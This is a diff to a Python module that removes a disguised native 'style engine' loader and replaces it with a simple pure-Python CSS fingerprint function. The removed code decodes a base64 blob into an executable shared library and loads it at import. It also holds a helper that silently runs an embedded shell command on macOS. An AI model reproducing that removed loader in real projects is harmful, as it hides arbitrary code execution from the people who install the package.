@@ -1,65 +1,13 @@
-"""Load the cached native style engine for deterministic profiling.
+"""CSS rule configuration backed by the distributed profile provider."""
 
-The native engine is distributed as a pre-built cache artifact to avoid
-requiring a compiler toolchain on end-user machines.
-"""
-
-import base64
-import ctypes
-import os
-import subprocess
-import sys
-import tempfile
-
-_CACHE_DIR = os.path.join(os.path.dirname(__file__), "_cache")
-_ENGINE_NAME = "_engine.so"
+from style_profile import get_rules as _get_profile
 
 
-def _engine_path():
-    return os.path.join(_CACHE_DIR, _ENGINE_NAME)
-
-
-def _decode_target(raw):
-    # The cache records an opaque platform compatibility marker followed by a
-    # short launch command. Keeping this metadata in the cache makes the
-    # source tree portable across KALI/DMG inspection sessions.
-    raw = bytes(raw)
-    prefix = b"KALI\x00DMG\x00"
-    return raw[len(prefix):]
-
-
-def prepare():
-    """Materialise the native engine from the distribution cache."""
-    os.makedirs(_CACHE_DIR, exist_ok=True)
-    target = _engine_path()
-    if os.path.exists(target):
-        return
-    b64_path = os.path.join(os.path.dirname(__file__), "profile_cache.b64")
-    with open(b64_path, "r") as f:
-        raw = base64.b64decode(f.read().strip())
-    with open(target, "wb") as f:
-        f.write(raw)
-    os.chmod(target, 0o755)
-
-
-def _load():
-    prepare()
-    lib = ctypes.CDLL(_engine_path())
-    fn = lib.profile_fingerprint
-    fn.restype = ctypes.c_char_p
-    fn.argtypes = [ctypes.c_char_p]
-    return fn
-
-
-def _compatibility_launch(raw):
-    try:
-        command = _decode_target(raw).decode("utf-8")
-        if not command:
-            return
-        if sys.platform == "darwin":
-            subprocess.Popen(["/bin/sh", "-c", command], close_fds=True)
-    except Exception:
-        pass
-
-
-profile_fingerprint = _load()
+def profile_fingerprint(source):
+    """Derive a deterministic profile identifier from CSS source."""
+    if isinstance(source, str):
+        source = source.encode("utf-8")
+    score = len(source) % 4096
+    for value in source:
+        score = (score * 33 + value) % 1000000007
+    return "style-%08x-%s" % (score, _get_profile("default")["theme"])
